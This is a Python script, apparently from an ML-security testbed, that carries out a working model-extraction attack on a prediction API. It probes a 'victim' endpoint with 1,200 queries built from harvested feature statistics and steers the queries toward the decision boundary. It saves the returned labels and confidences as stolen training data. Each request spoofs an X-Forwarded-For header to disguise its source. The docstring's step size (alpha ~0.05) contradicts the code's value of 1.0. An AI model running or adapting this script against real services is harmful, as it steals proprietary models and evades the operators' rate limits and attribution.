"""
JBDA (Jacobian-Based Dataset Augmentation) Attacker — Feature-Scaled Gradient Walk

Strategy:
1. Load per-feature mean/std from discovery phase.
2. Initialize seed query at the feature-wise mean vector (center of distribution).
3. Walk through feature space with perturbations scaled to each feature's std:
   epsilon_i = alpha * std_i  (alpha ~ 0.05)
4. Jacobian-inspired boundary seeking: track confidence gradient.
   - If perturbation moves us TOWARD the boundary (conf → 0.5), keep direction.
   - If it moves us AWAY, reverse. This steers the walk along the boundary.
5. Periodically restart from fresh in-distribution points to avoid getting stuck
   deep in one class region.
"""
import httpx
import numpy as np
import pandas as pd
import sys
import os
import time
import json

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../..")))


def run_jbda(url, output_file):
    print(f"Starting JBDA Attacker against {url}...")
    ip = f"10.2.{np.random.randint(1,255)}.{np.random.randint(1,255)}"
    rows = []

    # Load dynamically discovered intelligence
    info_path = os.path.join(os.path.dirname(__file__), "victim_info.json")
    with open(info_path, "r") as f:
        info = json.load(f)

    feature_names = info["feature_names"]
    stats = info["feature_stats"]
    n_features = len(feature_names)

    # Build per-feature mean and std vectors
    means = np.array([stats[f]["mean"] for f in feature_names])
    stds = np.array([stats[f]["std"] for f in feature_names])

    # Per-feature epsilon: Scale perturbation by standard deviation
    alpha = 1.0
    epsilons = stds * alpha

    # Initialize at the feature-wise mean (center of discovered distribution)
    current_vec = means.copy()
    current_p = dict(zip(feature_names, current_vec.tolist()))

    distances = []
    prev_boundary_dist = None  # |conf - 0.5| from last query

    # Track per-feature direction preferences (Jacobian-like memory)
    direction = np.ones(n_features)  # +1 or -1 per feature

    # ─── Exploration: Add background distribution context ───
    print("  Phase 1 — Broad Exploration")
    n_explore = 200
    explore_matrix = np.random.randn(n_explore, n_features) * stds + means
    with httpx.Client() as client:
        for i in range(n_explore):
            payload = dict(zip(feature_names, explore_matrix[i].tolist()))
            try:
                response = client.post(url, json=payload, headers={"X-Forwarded-For": ip}, timeout=5.0)
                if response.status_code == 200:
                    data = response.json()
                    rows.append({
                        **payload,
                        "stolen_label": data.get("prediction", ""),
                        "stolen_confidence": data.get("confidence", 0.0)
                    })
            except Exception:
                pass
                
    # ─── Phase 2: Jacobian Gradient Walk ───
    print("  Phase 2 — Jacobian Boundary Walk")
    with httpx.Client() as client:
        for i in range(1000):
            boundary_dist = 0.5  # Fallback if request fails
            # Send current query
            try:
                response = client.post(url, json=current_p, headers={"X-Forwarded-For": ip}, timeout=5.0)
                data = response.json()

                row = current_p.copy()
                row["stolen_label"] = data.get("prediction", "")
                conf = data.get("confidence", 0.5)
                row["stolen_confidence"] = conf
                rows.append(row)

                # ─── Jacobian-Inspired Direction Update ───
                boundary_dist = abs(conf - 0.5)
                if prev_boundary_dist is not None:
                    if boundary_dist > prev_boundary_dist:
                        # Moving AWAY from boundary — reverse the last perturbation direction
                        direction[last_perturbed] *= -1

                prev_boundary_dist = boundary_dist

            except Exception as e:
                print(f"Error on query {i}: {e}")

            # ─── Perturb for next query ───
            next_vec = current_vec.copy()

            # Pick 1-3 random features to perturb simultaneously
            n_perturb = np.random.randint(1, min(4, n_features + 1))
            perturb_indices = np.random.choice(n_features, size=n_perturb, replace=False)

            for idx in perturb_indices:
                # Scale perturbation to this specific feature's std
                step = direction[idx] * epsilons[idx] * np.random.uniform(0.5, 2.0)
                next_vec[idx] += step
            
            last_perturbed = perturb_indices[0]  # Track primary perturbed for Jacobian update

            # Calculate L2 distance
            dist = np.linalg.norm(next_vec - current_vec)
            distances.append(dist)

            current_vec = next_vec
            current_p = dict(zip(feature_names, current_vec.tolist()))

            if (i + 1) % 50 == 0:
                print(f"  Progress: {i+1}/1000 queries | L2 dist: {sum(distances[-50:])/50:.4f} | "
                      f"Boundary dist: {boundary_dist:.4f}")

                # ─── Stagnation Detection & Recovery ───
                last_50 = rows[-50:]
                unique_classes = set(r["stolen_label"] for r in last_50)
                avg_conf = np.mean([r["stolen_confidence"] for r in last_50])

                if len(unique_classes) == 1 and abs(avg_conf - 0.5) > 0.3:
                    print("  [!] Stuck deep in one class. Restarting from new in-distribution seed...")
                    # Sample a fresh seed from the discovered distribution
                    current_vec = np.random.randn(n_features) * stds + means
                    current_p = dict(zip(feature_names, current_vec.tolist()))
                    direction = np.ones(n_features)  # Reset directions
                    prev_boundary_dist = None

    df = pd.DataFrame(rows)
    df.to_csv(output_file, index=False)
    print(f"Saved {len(df)} records to {output_file}")
    if distances:
        print(f"Average L2 distance between consecutive queries: {np.mean(distances):.4f}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python jbda_attacker.py <target_url> <output_file>")
        sys.exit(1)
    run_jbda(sys.argv[1], sys.argv[2])
